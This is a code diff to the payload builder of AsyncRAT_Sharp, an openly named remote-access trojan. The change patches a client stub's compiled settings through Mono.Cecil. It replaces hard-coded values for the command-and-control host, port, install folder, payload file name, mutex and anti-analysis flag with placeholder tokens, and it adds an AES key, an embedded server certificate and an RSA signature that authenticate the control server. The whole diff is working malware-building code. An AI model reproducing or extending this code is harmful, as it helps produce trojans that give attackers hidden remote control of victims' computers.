@@ -4,6 +4,9 @@ using Mono.Cecil;
 using AsyncRAT_Sharp.Helper;
 using Mono.Cecil.Cil;
 using System.Text;
+using System.Security.Cryptography;
+using AsyncRAT_Sharp.Cryptography;
+using System.Security.Cryptography.X509Certificates;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -92,6 +95,17 @@ namespace AsyncRAT_Sharp.Forms
 
         private void WriteSettings(AssemblyDefinition asmDef)
         {
+            var key = Methods.GetRandomString(32);
+            var aes = new Aes256(key);
+            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
+            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
+            byte[] signature;
+            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
+            {
+                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
+                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
+            }
+
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
                 if (typeDef.FullName == "Client.Settings")
@@ -106,29 +120,35 @@ namespace AsyncRAT_Sharp.Forms
                                 {
                                     string operand = methodDef.Body.Instructions[i].Operand.ToString();
 
-                                    if (operand == "6606")
-                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textPort.Text);
+                                    if (operand == "%Ports%")
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textPort.Text);
 
-                                    if (operand == "127.0.0.1")
-                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textIP.Text);
+                                    if (operand == "%Hosts%")
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textIP.Text);
 
-                                    if (operand == "false")
+                                    if (operand == "%Install%")
                                         methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
 
-                                    if (operand == "%AppData%")
+                                    if (operand == "%Folder%")
                                         methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
 
-                                    if (operand == "Payload.exe")
+                                    if (operand == "%File%")
                                         methodDef.Body.Instructions[i].Operand = textFilename.Text;
 
-                                    if (operand == "NYAN CAT")
-                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(Settings.Password));
+                                    if (operand == "%Key%")
+                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
 
                                     if (operand == "%MTX%")
                                         methodDef.Body.Instructions[i].Operand = txtMutex.Text;
 
                                     if (operand == "%Anti%")
                                         methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
+
+                                    if (operand == "%Certificate%")
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
+
+                                    if (operand == "%Serversignature%")
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                 }
                             }
                         }
